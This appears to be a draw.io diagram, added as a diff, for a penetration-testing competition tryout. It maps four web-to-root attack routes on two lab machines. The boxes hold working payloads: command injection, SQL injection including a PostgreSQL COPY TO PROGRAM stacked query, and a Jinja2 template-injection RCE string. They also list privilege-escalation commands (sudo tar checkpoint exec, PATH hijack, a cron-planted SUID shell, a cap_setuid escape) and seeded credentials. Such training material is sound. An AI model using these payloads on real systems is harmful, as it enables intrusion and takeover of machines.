@@ -1,0 +1,117 @@
+<mxfile host="app.diagrams.net" type="device">
+  <diagram id="wormhole-routes" name="Web-to-Root Routes">
+    <mxGraphModel dx="1400" dy="900" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1200" pageHeight="760" math="0" shadow="0">
+      <root>
+        <mxCell id="0" />
+        <mxCell id="1" parent="0" />
+
+        <!-- Title + example note -->
+        <mxCell id="title" value="Wormhole CPTC Tryout — Web-to-Root Attack Routes" style="text;html=1;fontSize=18;fontStyle=1;align=left;verticalAlign=middle;" vertex="1" parent="1">
+          <mxGeometry x="20" y="16" width="1120" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="note" value="Each column is ONE complete route (web exploit → foothold shell on the host → local privilege escalation → root). The left column is the generic kill-chain — the worked example every route follows." style="text;html=1;fontSize=12;fontColor=#555555;align=left;verticalAlign=middle;" vertex="1" parent="1">
+          <mxGeometry x="20" y="48" width="1120" height="30" as="geometry" />
+        </mxCell>
+
+        <!-- Machine headers -->
+        <mxCell id="mh_rocky" value="MACHINE:  rocky   (Debian 12)&#10;Antimatter-Weapons  +  Bubble-Control" style="rounded=0;whiteSpace=wrap;html=1;fillColor=#d5e8d4;strokeColor=#82b366;fontStyle=1;fontSize=12;" vertex="1" parent="1">
+          <mxGeometry x="150" y="88" width="450" height="34" as="geometry" />
+        </mxCell>
+        <mxCell id="mh_hail" value="MACHINE:  hail mary   (Debian 12)&#10;HR-Portal  +  wormhole-casino-website" style="rounded=0;whiteSpace=wrap;html=1;fillColor=#d5e8d4;strokeColor=#82b366;fontStyle=1;fontSize=12;" vertex="1" parent="1">
+          <mxGeometry x="670" y="88" width="460" height="34" as="geometry" />
+        </mxCell>
+
+        <!-- Route header row -->
+        <mxCell id="rh_r1" value="R1 · Antimatter-Weapons" style="text;html=1;fontStyle=1;fontSize=11;align=center;fillColor=none;" vertex="1" parent="1">
+          <mxGeometry x="150" y="126" width="210" height="20" as="geometry" />
+        </mxCell>
+        <mxCell id="rh_r2" value="R2 · Bubble-Control" style="text;html=1;fontStyle=1;fontSize=11;align=center;fillColor=none;" vertex="1" parent="1">
+          <mxGeometry x="390" y="126" width="210" height="20" as="geometry" />
+        </mxCell>
+        <mxCell id="rh_h1" value="H1 · HR-Portal" style="text;html=1;fontStyle=1;fontSize=11;align=center;fillColor=none;" vertex="1" parent="1">
+          <mxGeometry x="670" y="126" width="210" height="20" as="geometry" />
+        </mxCell>
+        <mxCell id="rh_h2" value="H2 · Wormhole Casino" style="text;html=1;fontStyle=1;fontSize=11;align=center;fillColor=none;" vertex="1" parent="1">
+          <mxGeometry x="910" y="126" width="210" height="20" as="geometry" />
+        </mxCell>
+
+        <!-- Phase labels (the generic example) -->
+        <mxCell id="p1" value="① Recon / access" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#f5f5f5;strokeColor=#999999;fontStyle=1;" vertex="1" parent="1">
+          <mxGeometry x="20" y="150" width="120" height="72" as="geometry" />
+        </mxCell>
+        <mxCell id="p2" value="② Web exploit" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#ffe6cc;strokeColor=#d79b00;fontStyle=1;" vertex="1" parent="1">
+          <mxGeometry x="20" y="245" width="120" height="72" as="geometry" />
+        </mxCell>
+        <mxCell id="p3" value="③ Foothold&#10;(shell on host)" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#fff2cc;strokeColor=#d6b656;fontStyle=1;" vertex="1" parent="1">
+          <mxGeometry x="20" y="340" width="120" height="72" as="geometry" />
+        </mxCell>
+        <mxCell id="p4" value="④ Local&#10;enumeration" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#dae8fc;strokeColor=#6c8ebf;fontStyle=1;" vertex="1" parent="1">
+          <mxGeometry x="20" y="435" width="120" height="72" as="geometry" />
+        </mxCell>
+        <mxCell id="p5" value="⑤ Privilege&#10;escalation" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#e1d5e7;strokeColor=#9673a6;fontStyle=1;" vertex="1" parent="1">
+          <mxGeometry x="20" y="530" width="120" height="72" as="geometry" />
+        </mxCell>
+        <mxCell id="p6" value="⑥ Goal: root" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#f8cecc;strokeColor=#b85450;fontStyle=1;" vertex="1" parent="1">
+          <mxGeometry x="20" y="625" width="120" height="60" as="geometry" />
+        </mxCell>
+
+        <!-- ============ Route R1: Antimatter → sudo tar ============ -->
+        <mxCell id="r1_1" value="GET /robots.txt&#10;→ /static/notes.txt&#10;→ GET /admin?admin=1 (leaks creds/secrets)" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#f5f5f5;strokeColor=#999999;fontSize=10;" vertex="1" parent="1"><mxGeometry x="150" y="150" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="r1_2" value="POST /api/launch  target_id=&quot;pwn&quot;&#10;→ ValueError 500 → Werkzeug&#10;debug console (debug=True)" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#ffe6cc;strokeColor=#d79b00;fontSize=10;" vertex="1" parent="1"><mxGeometry x="150" y="245" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="r1_3" value="RCE as svc-antimatter" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#fff2cc;strokeColor=#d6b656;fontSize=10;" vertex="1" parent="1"><mxGeometry x="150" y="340" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="r1_4" value="sudo -l →&#10;(root) NOPASSWD: /usr/bin/tar" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#dae8fc;strokeColor=#6c8ebf;fontSize=10;" vertex="1" parent="1"><mxGeometry x="150" y="435" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="r1_5" value="sudo tar -cf /dev/null /dev/null&#10;--checkpoint=1&#10;--checkpoint-action=exec=/bin/sh" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#e1d5e7;strokeColor=#9673a6;fontSize=10;" vertex="1" parent="1"><mxGeometry x="150" y="530" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="r1_6" value="★ root @ rocky" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#f8cecc;strokeColor=#b85450;fontStyle=1;fontSize=11;" vertex="1" parent="1"><mxGeometry x="150" y="625" width="210" height="60" as="geometry"/></mxCell>
+
+        <!-- ============ Route R2: Bubble → SUID hijack ============ -->
+        <mxCell id="r2_1" value="login guest/guest (weak creds)&#10;or forge session cookie&#10;(hardcoded secret bubble_ctrl_2049)" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#f5f5f5;strokeColor=#999999;fontSize=10;" vertex="1" parent="1"><mxGeometry x="390" y="150" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="r2_2" value="GET /api/status-check?host=&#10;127.0.0.1;id&#10;OS command injection (shell=True)" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#ffe6cc;strokeColor=#d79b00;fontSize=10;" vertex="1" parent="1"><mxGeometry x="390" y="245" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="r2_3" value="RCE as svc-bubble" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#fff2cc;strokeColor=#d6b656;fontSize=10;" vertex="1" parent="1"><mxGeometry x="390" y="340" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="r2_4" value="find / -perm -4000 →&#10;/usr/local/bin/bubble-diag (SUID root,&#10;calls ps/cat by relative name)" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#dae8fc;strokeColor=#6c8ebf;fontSize=10;" vertex="1" parent="1"><mxGeometry x="390" y="435" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="r2_5" value="PATH-hijack 'cat':&#10;PATH=/tmp/x:$PATH ./bubble-diag&#10;→ runs attacker 'cat' as root" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#e1d5e7;strokeColor=#9673a6;fontSize=10;" vertex="1" parent="1"><mxGeometry x="390" y="530" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="r2_6" value="★ root @ rocky" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#f8cecc;strokeColor=#b85450;fontStyle=1;fontSize=11;" vertex="1" parent="1"><mxGeometry x="390" y="625" width="210" height="60" as="geometry"/></mxCell>
+
+        <!-- ============ Route H1: HR-Portal → writable cron ============ -->
+        <mxCell id="h1_1" value="SQLi login bypass:  admin'--&#10;(f-string query)  or seeded creds&#10;awong / Password1!" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#f5f5f5;strokeColor=#999999;fontSize=10;" vertex="1" parent="1"><mxGeometry x="670" y="150" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="h1_2" value="POST /profile/greeting  template=&#10;{{ cycler.__init__.__globals__.os&#10;.popen('id').read() }}  — Jinja2 SSTI" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#ffe6cc;strokeColor=#d79b00;fontSize=10;" vertex="1" parent="1"><mxGeometry x="670" y="245" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="h1_3" value="RCE as svc-hr" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#fff2cc;strokeColor=#d6b656;fontSize=10;" vertex="1" parent="1"><mxGeometry x="670" y="340" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="h1_4" value="cat /etc/cron.d/* (or pspy) →&#10;/opt/hailmary/tasks/hr-nightly.sh&#10;runs as root, group-writable by svc-hr" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#dae8fc;strokeColor=#6c8ebf;fontSize=10;" vertex="1" parent="1"><mxGeometry x="670" y="435" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="h1_5" value="echo 'cp /bin/bash /tmp/rb;&#10;chmod 4755 /tmp/rb' &gt;&gt; hr-nightly.sh&#10;wait for cron → /tmp/rb -p" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#e1d5e7;strokeColor=#9673a6;fontSize=10;" vertex="1" parent="1"><mxGeometry x="670" y="530" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="h1_6" value="★ root @ hail mary" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#f8cecc;strokeColor=#b85450;fontStyle=1;fontSize=11;" vertex="1" parent="1"><mxGeometry x="670" y="625" width="210" height="60" as="geometry"/></mxCell>
+
+        <!-- ============ Route H2: Wormhole Casino → cap_setuid ============ -->
+        <mxCell id="h2_1" value="unauthenticated&#10;target endpoint: POST /login&#10;(raw pg.Pool query)" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#f5f5f5;strokeColor=#999999;fontSize=10;" vertex="1" parent="1"><mxGeometry x="910" y="150" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="h2_2" value="email=x'; COPY (SELECT '')&#10;TO PROGRAM 'id'; --&#10;SQLi → stacked query (pg superuser)" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#ffe6cc;strokeColor=#d79b00;fontSize=10;" vertex="1" parent="1"><mxGeometry x="910" y="245" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="h2_3" value="command exec as postgres" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#fff2cc;strokeColor=#d6b656;fontSize=10;" vertex="1" parent="1"><mxGeometry x="910" y="340" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="h2_4" value="getcap -r / →&#10;/opt/hailmary/bin/casino-report&#10;cap_setuid+ep  (world-executable)" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#dae8fc;strokeColor=#6c8ebf;fontSize=10;" vertex="1" parent="1"><mxGeometry x="910" y="435" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="h2_5" value="casino-report -c&#10;'import os;os.setuid(0);&#10;os.system(&quot;/bin/bash&quot;)'" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#e1d5e7;strokeColor=#9673a6;fontSize=10;" vertex="1" parent="1"><mxGeometry x="910" y="530" width="210" height="72" as="geometry"/></mxCell>
+        <mxCell id="h2_6" value="★ root @ hail mary" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#f8cecc;strokeColor=#b85450;fontStyle=1;fontSize=11;" vertex="1" parent="1"><mxGeometry x="910" y="625" width="210" height="60" as="geometry"/></mxCell>
+
+        <!-- Edges (vertical chains) -->
+        <mxCell id="e_r1_12" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="r1_1" target="r1_2"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_r1_23" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="r1_2" target="r1_3"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_r1_34" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="r1_3" target="r1_4"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_r1_45" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="r1_4" target="r1_5"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_r1_56" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="r1_5" target="r1_6"><mxGeometry relative="1" as="geometry"/></mxCell>
+
+        <mxCell id="e_r2_12" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="r2_1" target="r2_2"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_r2_23" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="r2_2" target="r2_3"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_r2_34" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="r2_3" target="r2_4"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_r2_45" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="r2_4" target="r2_5"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_r2_56" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="r2_5" target="r2_6"><mxGeometry relative="1" as="geometry"/></mxCell>
+
+        <mxCell id="e_h1_12" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="h1_1" target="h1_2"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_h1_23" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="h1_2" target="h1_3"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_h1_34" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="h1_3" target="h1_4"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_h1_45" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="h1_4" target="h1_5"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_h1_56" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="h1_5" target="h1_6"><mxGeometry relative="1" as="geometry"/></mxCell>
+
+        <mxCell id="e_h2_12" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="h2_1" target="h2_2"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_h2_23" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="h2_2" target="h2_3"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_h2_34" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="h2_3" target="h2_4"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_h2_45" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="h2_4" target="h2_5"><mxGeometry relative="1" as="geometry"/></mxCell>
+        <mxCell id="e_h2_56" style="edgeStyle=orthogonalEdgeStyle;html=1;endArrow=block;strokeColor=#333333;" edge="1" parent="1" source="h2_5" target="h2_6"><mxGeometry relative="1" as="geometry"/></mxCell>
+      </root>
+    </mxGraphModel>
+  </diagram>
+</mxfile>
